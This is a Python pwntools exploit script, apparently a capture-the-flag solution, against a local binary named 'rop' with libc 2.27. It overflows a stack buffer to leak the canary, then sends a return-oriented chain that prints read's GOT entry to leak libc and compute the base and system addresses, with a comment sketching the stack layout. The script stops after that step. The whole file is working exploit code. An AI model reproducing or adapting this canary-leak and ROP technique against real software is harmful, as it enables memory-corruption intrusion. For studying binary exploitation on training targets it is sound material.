from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connection
p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc-2.27.so')

# Set Context
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'debug'

# Leak Canary
buf = b'A' * (0x40 - 0x08 + 0x01)
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
slog('Canary', canary)

# Exploit
read_plt = e.plt["read"]
read_got = e.got["read"]
puts_plt = e.plt["puts"]
read_system = libc.symbols["read"]-libc.symbols["system"]
pop_rdi = 0x00000000004007f3

payload = b'A' * (0x40 - 0x08) + p64(canary) + b'B' * 0x08
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2)
libc_base = read - libc.symbols["read"]
system = libc_base + libc.symbols["system"]
slog('read', read)
slog('libc_base', libc_base)
slog('system', system)

'''

|    buf    |  0x30
|   dummy   |  0x08
|   canary  |  0x08
|    SFP    |  0x08
|    RET    |  0x08


'''
